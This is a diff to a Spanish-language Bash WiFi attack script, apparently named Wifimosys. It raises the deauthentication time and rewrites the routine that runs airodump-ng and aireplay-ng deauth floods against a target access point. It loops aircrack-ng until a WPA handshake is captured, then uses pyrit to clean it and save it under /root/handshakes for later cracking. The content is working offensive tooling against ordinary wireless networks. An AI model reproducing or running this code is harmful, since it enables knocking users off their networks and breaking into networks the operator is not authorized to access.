@@ -15,12 +15,12 @@ clear
 ##################################### Configuración general del script
 
 revision=1
-version=0.19
+version=0.20
 IP=192.168.1.1
 RUTATEMP="/tmp/Wifimosys"
 RUTAHANDSHAKE="/root/handshakes"
 RUTAPASS="/root/pwlog"
-DEAUTHTIME="20"
+DEAUTHTIME="99"
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
 
 white="\033[1;37m"
@@ -563,16 +563,16 @@ function captura {
 
 	rm -rf $RUTATEMP/$Host_MAC*
 	xterm $HOLD -title "HANDSHAKE" $VENTHAND -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $RUTATEMP/$Host_MAC --channel $Host_CHAN -a $WIFI_MONITOR &> /dev/null &
-	deauthall; sleep 5
+	deauthall;
 	NOW=$(date "+%s")
-	Handshake_statuscheck="${red}No se ha conseguido el handshake.$transparent"
-	while true; do
-	if [ $(($(date "+%s")-$NOW)) -ge 10 ];then
-	    killall airodump-ng &break &deauthMENU &elechand 
-	  elif echo $(aircrack-ng $RUTATEMP/$Host_MAC"-01.cap") | grep "(1 handshake)" &> /dev/null; then
+	sleep 5
+	until [ $(($(date "+%s")-$NOW)) -ge 15 ]; do
+	  if aircrack-ng $RUTATEMP/$Host_MAC-01.cap | grep -q "1 handshake"; then
 	    killall airodump-ng aireplay-ng &break &checkhandshake
-	fi
+	  fi
 	done
+	Handshake_statuscheck="${red}No se ha conseguido el handshake.$transparent"
+	killall airodump-ng aireplay-ng &break &deauthMENU &elechand
 }
 
 ##################################### Comprueba el handshake antes de continuar
@@ -586,8 +586,8 @@ function checkhandshake {
 	pyrit -r $RUTATEMP/$Host_MAC-01.cap -o $RUTATEMP/test.cap stripLive &>$wifim_output_device
 
 	if pyrit -r $RUTATEMP/test.cap analyze 2>&1 | grep -q "good,"; then
-		killall airodump-ng mdk3 aireplay-ng &>$wifim_output_device
 		pyrit -r $RUTATEMP/test.cap -o $RUTAHANDSHAKE/$Host_SSID.cap strip &>$wifim_output_device
+#		Handshake_statuscheck="${red}HANDSHAKE COJONUDO$transparent" &break &deauthMENU &captura
 		CreaSSL
 		i=2
 		break
